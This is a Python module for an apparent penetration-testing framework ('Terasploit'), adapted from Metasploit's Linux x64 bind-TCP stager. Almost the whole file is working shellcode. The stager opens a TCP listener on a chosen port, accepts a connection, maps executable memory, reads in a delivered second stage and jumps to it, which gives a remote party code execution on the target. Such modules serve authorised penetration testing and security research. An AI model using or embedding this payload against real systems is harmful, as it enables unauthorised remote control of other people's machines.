import struct
from collections.abc import Sequence

from teralibs.tsf.base.payload import ARCH_X64, PLATFORM_LINUX, STAGER, Payload, PayloadHandler
from teralibs.tsf.core.payload.linux.x64.prepends import LinuxX64Prepends


class TerasploitModule(LinuxX64Prepends, Payload):
    """Linux x64 bind-TCP stager."""

    NAME: str = "Linux x64 Bind TCP Stager"
    DESCRIPTION: str = (
        "Linux x86-64 bind-TCP stager that opens a TCP listener on the target, waits for the framework to connect, and executes the delivered stage."
    )
    AUTHOR: Sequence = ["4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.1"
    RANK: str = "normal"
    REFERENCES: Sequence = [
        "https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/linux/x64/bind_tcp.rb",
    ]
    PAYLOAD_TYPE: str = STAGER
    HANDLER: object = PayloadHandler.BindTCP
    STAGE_PATH: str = "linux.x64.shell"
    CACHED_SIZE: int = 88
    MAX_SIZE: int | None = 350
    ARCH: Sequence = [ARCH_X64]
    PLATFORM: Sequence = [PLATFORM_LINUX]
    OPTIONS: Sequence = ["RHOST", "LPORT"]

    def generate(self, ctx):
        """Generate the Linux x64 bind-TCP stager shellcode."""
        port = int(ctx.get_option("LPORT"))

        # Port is patched at offset 20
        port_be = struct.pack(">H", port)

        shellcode = (
            b"\x6a\x29"  # pushq  $0x29
            + b"\x58"  # pop    %rax
            + b"\x99"  # cltd
            + b"\x6a\x02"  # pushq  $0x2
            + b"\x5f"  # pop    %rdi
            + b"\x6a\x01"  # pushq  $0x1
            + b"\x5e"  # pop    %rsi
            + b"\x0f\x05"  # syscall
            + b"\x48\x97"  # xchg   %rax,%rdi
            + b"\x52"  # push   %rdx
            + b"\xc7\x04\x24\x02\x00"
            + port_be  # movl   $0xb3150002,(%rsp)
            + b"\x48\x89\xe6"  # mov    %rsp,%rsi
            + b"\x6a\x10"  # pushq  $0x10
            + b"\x5a"  # pop    %rdx
            + b"\x6a\x31"  # pushq  $0x31
            + b"\x58"  # pop    %rax
            + b"\x0f\x05"  # syscall
            + b"\x59"  # pop    %rcx
            + b"\x6a\x32"  # pushq  $0x32
            + b"\x58"  # pop    %rax
            + b"\x0f\x05"  # syscall
            + b"\x48\x96"  # xchg   %rax,%rsi
            + b"\x6a\x2b"  # pushq  $0x2b
            + b"\x58"  # pop    %rax
            + b"\x0f\x05"  # syscall
            + b"\x50"  # push   %rax
            + b"\x56"  # push   %rsi
            + b"\x5f"  # pop    %rdi
            + b"\x6a\x09"  # pushq  $0x9
            + b"\x58"  # pop    %rax
            + b"\x99"  # cltd
            + b"\xb6\x10"  # mov    $0x10,%dh
            + b"\x48\x89\xd6"  # mov    %rdx,%rsi
            + b"\x4d\x31\xc9"  # xor    %r9,%r9
            + b"\x6a\x22"  # pushq  $0x22
            + b"\x41\x5a"  # pop    %r10
            + b"\xb2\x07"  # mov    $0x7,%dl
            + b"\x0f\x05"  # syscall
            + b"\x48\x96"  # xchg   %rax,%rsi
            + b"\x48\x97"  # xchg   %rax,%rdi
            + b"\x5f"  # pop    %rdi
            + b"\x0f\x05"  # syscall
            + b"\xff\xe6"  # jmpq   *%rsi
        )

        return self.apply_prepends(bytes(shellcode), ctx)
